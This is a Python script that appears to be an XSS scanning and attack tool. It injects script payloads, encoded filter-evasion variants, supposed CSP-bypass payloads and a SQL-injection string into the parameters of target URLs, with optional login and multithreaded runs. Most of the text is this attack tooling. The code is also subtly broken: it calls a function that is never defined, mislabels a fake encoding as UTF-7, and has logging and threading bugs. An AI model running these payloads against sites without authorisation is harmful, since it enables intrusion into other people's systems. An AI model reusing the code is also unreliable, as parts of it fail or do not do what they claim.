import requests
from bs4 import BeautifulSoup
from urllib.parse import quote, urlparse, urljoin
import json
import threading
import argparse
import csv
import time
from datetime import datetime
from random import choice
import base64

# Function to log results to a file (supports CSV, plain text, and HTML)
def log_result(log_file, message, csv_log=False, html_log=False):
    if csv_log:
        with open(log_file, 'a', newline='') as f:
            writer = csv.writer(f)
            writer.writerow(message)
    elif html_log:
        with open(log_file, 'a') as f:
            f.write(f"<tr><td>{'</td><td>'.join(message)}</td></tr>\n")
    else:
        with open(log_file, 'a') as f:
            f.write(message + "\n")

# Function to encode payloads to bypass filters
def encode_payload(payload):
    return quote(payload)

# Function to create bypass techniques for XSS payloads
def bypass_techniques(payload):
    techniques = [
        payload,
        encode_payload(payload),
        payload.replace("<", "&lt;").replace(">", "&gt;"),  # HTML entity encoding
        payload.replace(" ", "%20"),  # Space encoding
        payload.replace("'", "&#x27;"),  # Single quote encoding
        base64.b64encode(payload.encode()).decode('utf-8'),  # Base64 encoding
    ]
    # Adding UTF-7 encoding as an additional technique
    utf7_payload = '+'.join([f"+{ord(c):04x}" for c in payload])
    techniques.append(utf7_payload)

    return techniques

# Function to create polyglot payloads that work in multiple contexts
def polyglot_payloads():
    return [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
        "javascript:alert(1)//",
        "' OR '1'='1';--",
        "<iframe src=javascript:alert(1)>"
    ]

# Function to test for CSP and detect blocking
def detect_csp(headers):
    if 'Content-Security-Policy' in headers:
        print("[!] Content Security Policy (CSP) detected, attempting to bypass.")
        # Bypass payloads for CSP-protected pages
        return [
            "<img src='x' onerror='alert(1)'>",
            "<script nonce='random_nonce'>alert(1)</script>",
            "<object data='javascript:alert(1)'></object>",
        ]
    return []

# Function to fuzz payloads by adding random mutations
def fuzz_payload(payload):
    fuzzed_payloads = [payload.replace("<", "<<").replace(">", ">>"), payload.replace(" ", "// ")]
    return fuzzed_payloads

# Function to handle authenticated requests (e.g., login, OAuth tokens)
def authenticate_user(session, login_url, credentials, headers=None):
    try:
        response = session.post(login_url, data=credentials, headers=headers)
        if response.status_code == 200:
            print("[+] Successfully logged in.")
            return True
        else:
            print("[!] Failed to log in.")
            return False
    except Exception as e:
        print(f"[!] Error during authentication: {e}")
        return False

# Function to test XSS vulnerability on a single URL
def check_xss(url, params, payload, method="GET", headers=None, cookies=None, log_file="xss_log.txt", csv_log=False, html_log=False):
    try:
        if method.upper() == "GET":
            response = requests.get(url, params=params, headers=headers, cookies=cookies, timeout=10)
        else:
            response = requests.post(url, data=params, headers=headers, cookies=cookies, timeout=10)

        # Parse the response content
        soup = BeautifulSoup(response.content, 'html.parser')

        # Check if the payload is reflected in the response
        for key, value in params.items():
            if value in str(soup):
                result = f"[+] XSS vulnerability found at: {url} using {method} with payload: {payload} in parameter {key}"
                print(result)
                log_result(log_file, [url, method, payload, "Vulnerable", datetime.now()], csv_log, html_log)
            else:
                result = f"[-] No XSS vulnerability found at: {url} using {method} with payload: {payload} in parameter {key}"
                print(result)
                log_result(log_file, [url, method, payload, "Not Vulnerable", datetime.now()], csv_log, html_log)

        # CSP detection
        csp_payloads = detect_csp(response.headers)
        if csp_payloads:
            for csp_payload in csp_payloads:
                test_params = construct_params(params, csp_payload)
                check_xss(url, test_params, csp_payload, method=method, headers=headers, cookies=cookies, log_file=log_file, csv_log=csv_log, html_log=html_log)

    except requests.Timeout:
        print(f"[!] Timeout occurred for {url}")
    except Exception as e:
        print(f"[!] Error occurred: {e}")

# Function to construct query params with payload for all parameters
def construct_params(params, payload):
    return {param: payload for param in params}

# Function to run XSS tests in parallel using threading
def run_parallel_tests(url_list, payloads, methods, headers=None, cookies=None, log_file="xss_log.txt", num_threads=5, csv_log=False, html_log=False):
    def worker(url_chunk):
        test_xss_multiple_urls(url_chunk, payloads, methods, headers, cookies, log_file, csv_log, html_log)
    
    chunk_size = len(url_list) // num_threads
    threads = []

    for i in range(0, len(url_list), chunk_size):
        url_chunk = url_list[i:i+chunk_size]
        thread = threading.Thread(target=worker, args=(url_chunk,))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

# Example payloads with fuzzing and encoding techniques
payloads = [fuzzed_payload for payload in polyglot_payloads() for fuzzed_payload in fuzz_payload(payload)]
payloads += [encoded_payload for payload in polyglot_payloads() for encoded_payload in bypass_techniques(payload)]

